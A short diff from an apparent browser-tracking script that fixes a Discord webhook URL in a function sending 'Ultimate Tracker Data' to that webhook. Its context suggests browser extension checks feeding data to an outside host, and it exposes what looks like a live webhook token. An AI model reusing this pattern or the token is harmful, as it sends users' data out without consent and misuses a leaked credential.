@@ -340,8 +340,7 @@ function checkCommonExtensions() {
 
 // Discord Webhook Integration
 function sendToDiscordWebhook(data) {
-    const webhookUrl = 'https://discord.com/api/webhooks/1402364477877518446/1v4i9TTbl1-3eIQhrBI_rfMNfI9FJ0QJ0g3t-C6bDKzJzjD0VXYqDvn9jFgu1fvHUptb
-'; 
+    const webhookUrl = 'https://discord.com/api/webhooks/1402364477877518446/1v4i9TTbl1-3eIQhrBI_rfMNfI9FJ0QJ0g3t-C6bDKzJzjD0VXYqDvn9jFgu1fvHUptb'; 
     
     const embed = {
         title: "Ultimate Tracker Data",
